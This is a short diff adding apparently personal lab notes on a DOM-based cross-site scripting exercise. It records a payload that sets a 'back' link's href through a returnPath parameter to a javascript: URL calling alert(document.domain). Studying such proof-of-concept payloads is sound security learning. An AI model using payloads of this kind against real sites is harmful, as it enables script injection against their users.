@@ -1,0 +1,5 @@
+#Change href of "back" to DOM XSS document.Domain
+
+#Payload
+  
+feedback?returnPath=javascript:alert(document.domain)
